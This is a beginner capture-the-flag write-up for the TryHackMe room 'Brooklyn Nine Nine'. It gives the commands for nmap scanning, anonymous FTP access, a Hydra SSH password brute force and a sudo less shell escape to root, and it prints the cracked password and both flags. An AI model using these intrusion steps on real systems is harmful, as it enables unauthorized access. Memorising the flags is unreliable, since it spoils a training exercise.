# **BROOKLYN NINE NINE — THM — WRITEUP**

**![5kullk3r][image1]**  
[5kullk3r](https://5kullk3r.medium.com/?source=post_page---byline--3fa4caf1c83a---------------------------------------)

Hello everyone\! This is an easy room from the TryHackMe platform called **“Brookly Nine Nine ”**.

This was one of the easiest rooms and a very fun room for beginners to try out .

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image2]

First, we deploy the machine. While it’s booting up, go ahead and open your terminal tab and get it ready

![][image3]

Once it is deployed, we start by visiting the webpage.

![][image4]

Then I Inspect the page source (Right-click → Inspect or Ctrl \+ U)

![][image5]

I Notice a **.jpg file** mentioned.

![][image6]

The hint suggests using **steganography**, so download the image and then

*strings image.jpg*  
*steghide extract \-sf image.jpg*

*![][image7]*

But no luck with this, so I go back to terminal and run the nmap:

![][image8]

*nmap \-sV \-A \-p- 10.10.121.215*

Through this I find:

* **FTP (21) open** → Possible anonymous login.  
* **SSH (22) open** → Potential entry point.

# **Exploiting FTP (Anonymous Login)**

Connect to FTP

![][image9]

*ftp 10.10.121.215*

*Name: anonymous*  
*Password: anonymous*

Once in:

*ls \-la*

*get note\_to\_jake.txt*

*exit*

Now once out of the ftp:

*cat note\_to\_jake.txt*

*![][image10]*

The note hints the username to ssh is Jake, yet the password is not known

This makes me turn to Hydra:

![][image11]

*hydra \-l jake \-P /usr/share/wordlists/rockyou.txt ssh://10.10.121.215*

**kaboom\!**

***Username:** jake*

***Password:** 987654321*

# **SSH Access**

**![][image12]**

Now we login to SSH :

*ssh jake@10.10.121.215 \-p 22*

Once in :

![][image13]

*ls \-la*

*cd /home*  
*ls \-la*  
*cd holt*

*cat user.txt*

That leads us to the user.txt flag:

ee11cbb19052e40b07aac0ca060c23ee

# **Privilege Escalation**

Now to gain root access we first use sudo \-l

*sudo \-l*

Then it shows this :

![][image14]

Then we see :

* **/bin/less** can be run as root.

So immediately head to gtfo bins:

* Look up **GTFOBins** for less (sudo): [https://gtfobins.github.io/gtfobins/less/\#sudo](https://gtfobins.github.io/gtfobins/less/#sudo)

![][image15]

Run less with root privilege

![][image16]

*sudo less /etc/profile*

Activate a shell within less

Type :

*\!/bin/sh*

and press **Enter**

Now type the command:

*whoami*

*cd /root*

*ls \-la*

*cat root.txt*

This leads us to the root.txt flag

63a9f0ea7bb98050796b649e85481845
